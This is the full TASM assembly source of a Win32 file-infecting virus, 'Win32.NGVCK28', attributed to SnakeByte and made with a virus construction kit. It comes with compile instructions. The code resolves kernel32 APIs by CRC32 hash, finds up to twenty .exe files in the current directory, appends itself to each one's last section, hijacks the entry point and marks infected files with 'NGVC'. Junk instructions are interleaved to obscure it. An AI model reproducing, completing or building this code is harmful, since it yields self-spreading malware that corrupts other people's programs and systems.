              
;
;
; Win32.NGVCK28 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK28
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 22
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebx
                                        ; mov ebp, ebx
 mov ebp, ebx
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 mov ecx, dword ptr [ebp+KernelPE]
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; get Export-Table
                                        ; clear esi
 mov esi, -59556d
 add esi, 59556d
 add esi, [ecx+78h]
 adc eax, 41492760d                     ; Trash
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add esi, 4
 inc esi
 xor dword ptr [ebp+Trash1], 1371815    ; Trash
 add esi, 3d
                                        ; get NTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
                                        ; add esi, 4
 inc esi
 add esi, 3d
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [esi]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
 and dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; clear ebx
 mov ebx, -43005d
 add ebx, 43005d
 xor ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
                                        ; mov ebx, eax
                                        ; clear ebx
 mov ebx, 0
 add ebx, eax
                                        ; mov edi, ebx
 push ebx
 pop edi
 push edi
 pop dword ptr [ebp+TempApisearch2]
 mov dword ptr [ebp+TempApisearch3], 0
 shl eax, 22d                           ; Trash
 add dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop eax
 sub eax, dword ptr [edx]
 sub eax, 1
 inc eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov edx, dword ptr [ebp+TempApisearch3]
                                        ; clear edi
 mov edi, -9117d
 add edi, 9117d
 xor edi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov edi, ebx
 movzx ebx, word ptr [edi]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ecx
 mov ecx, -35004d
 add ecx, 35004d
 xor ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xor eax, 81728840d                     ; Trash
 xchg edx, ecx

 mov esi, ebp
 add esi, offset APIOffsets


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 dec esi
 add esi, 5d
 dec ebx
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg ecx, ebx

 push ebx
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; get File Alignment
 mov ebx, [edx+3Ch]
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], ebx
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, esi
 add edi, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push edi
 pop esi
                                        ; get last section
 movzx ecx, word ptr [esi+06h]
 sub ecx, 1
 imul ecx, ecx, 28h
 add edi, ecx
                                        ; add edi, 120
 add edi, 120d
 mov ebx, dword ptr [esi+74h]
 sal ebx, 3
 add edi, ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
                                        ; clear ecx
 mov ecx, -24372d
 add ecx, 24372d

 add ecx, [edi+10h]
                                        ; mov ebx, ecx
 push ecx
 pop ebx
 add edi, 14h
 add ecx, [edi]
 sub edi, 14h
 push ecx
 mov eax, ebx
 add edi, 0Ch
 add eax, [edi]
 sub edi, 0Ch
 push eax
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
 mov eax, [edi+10h]
 push eax
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 sub edx, 32211703d                     ; Trash
 add eax, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edi+08h], 0
 add dword ptr [edi+08h], eax
 mov eax, dword ptr [edi+0Ch]
 add eax, dword ptr [edi+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
 rcl edx, 1d                            ; Trash
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea eax, [ebp+Virus]
 xchg esi, eax


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -9160d
 add edx, 9160d
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]

 sbb eax, 6d                            ; Trash

Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx

 mov ebx, dword ptr [ebp+OldEIP]

 push ebx
 add dword ptr [ebp+Trash1], edx        ; Trash
 pop dword ptr [ebp+retEIP]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea eax, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 sbb ebx, 6d                            ; Trash
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edi, -1
 push -1d
 pop edi
 and edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; clear edx
 xor edx, edx
                                        ; add edx, 1
 add edx, 1d
 sub edx, 1
 jz Notagoodfile

Goodfile:
 sub ebx, ebx                           ; Trash
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [edi+3Ch]
 test ebx, ebx
 jz Notagoodfile
 push dword ptr [edi+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
 add dword ptr [ebp+Trash1], edx        ; Trash
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [ecx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ecx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

 or edx, ebx                            ; Trash
CRC32:
 pushad
                                        ; mov esi, edi
 mov esi, edi
                                        ; mov ebx, edi
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, edi
LenCRC:
                                        ; add ebx, 1
 add ebx, 1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, esi
                                        ; mov edi, ebx
 push ebx
 pop edi
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear ecx
 xor ecx, ecx
 sub ecx, 1
                                        ; mov edx, ecx
 mov edx, ecx
NextByteCRC:
                                        ; clear ebx
 mov ebx, -53807d
 add ebx, 53807d
                                        ; clear eax
 push 0
 pop eax
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 xor bl, cl
 mov cl, ch
 mov ch, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr ax, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor ax,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor ecx, ebx
 xor edx, eax
 dec edi
jnz NextByteCRC
 not edx
 not ecx
 mov ebx, edx
 rol ebx, 16d
 mov bx, cx
 mov dword ptr [ebp+APICRC32], ebx
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 FindHandle  dd 0h
 ATableVA    dd 0h
 AlignReg2   dd 0h
 APICRC32    dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NewEIP      dd 0h
 TempApisearch2 dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h

 MapAddress  dd 0h
 NTableVA    dd 0h
 filemask    db '*.Exe',0
 OldEIP      dd 0h
 FileHandle  dd 0h
 OTableVA    dd 0h
 KernelMZ    dd 0h
 counter     dw 0h
 db 'Win32.NGVCK28 - SnakeByte',0
 MapHandle   dd 0h

 APINames:
 dd 0AA700106h           ; FindNextFileA
 dd 094524B42h           ; UnmapViewOfFile
 dd 0797B49ECh           ; MapViewOfFile
 dd 068624A9Dh           ; CloseHandle
 dd 08C892DDFh           ; CreateFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C200BE21h           ; FindClose
 dd 0AE17EBEFh           ; FindFirstFileA

 Trash1      dd 0h
 K32Trys     dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h
 AlignReg1   dd 0h
 TempApisearch3 dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edi, ebp
 add edi, offset WIN32_FIND_DATA

 push edi
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d - 2d )
 add ebx, 2d
 lea eax, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 sub eax, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 xor ecx, edx                           ; Trash
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, ( -1d - 32d )
 add edx, 32d
 and edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, -11272d
 add ebx, 11272d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 sub ebx, -1d
 push ebx
 mov ebx, 80000000h or 40000000h
 push ebx
 lea eax, [ebp+WFD_szFileName]
 xchg ebx, eax

 push ebx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax
 adc ecx, 69701692d                     ; Trash

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear edx
 xor edx, edx
 push edx
 push ebx
 shl ecx, 2d                            ; Trash
 push edx
                                        ; mov ecx, 4
 mov ecx, ( 4d + 34d )
 sub ecx, 34d
 push ecx
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 and edx, 45741551d                     ; Trash
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear edx
 mov edx, 67232d
 sub edx, 67232d
 push ebx
 push edx
 push edx
 sbb ecx, 26d                           ; Trash
                                        ; mov eax, 2
 mov eax, ( 2d + 0d )
 sub eax, 0d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 or edx, ecx                            ; Trash
                                        ; mov ecx, 4
 push 4d
 pop ecx
 sub esp, ecx
                                        ; round to pages
 shr ebx, 16d
 rol ebx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 inc dword ptr [ebp+Trash1]             ; Trash
 cmp eax, 0h
 jz NoKernel
                                        ; check for ZM
 movzx eax, word ptr [ebx]
 ror edx, 12d                           ; Trash
 sub eax, 'ZM'
 jz CheckPE

GK2:
                                        ; mov eax, 65536
 mov eax, ( 65536d - 11d )
 add eax, 11d
 sub ebx, eax
 mov ecx, dword ptr [ebp+K32Trys]
 dec ecx
 mov dword ptr [ebp+K32Trys], -1
 adc edx, 40070237d                     ; Trash
 and dword ptr [ebp+K32Trys], ecx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ecx, [ebx+3Ch]
 neg ebx
 sub ecx, ebx
 neg ebx
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ecx, 22
 add ecx, 22d
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ecx]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
                                        ; mov eax, 22
 push 22d
 pop eax
 sub ecx, eax


KernelFound:
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], ecx
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], ebx

 jmp GetApis

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 sub ebx, ebx
 push ebx
 call ExitProcess



end FakeCode

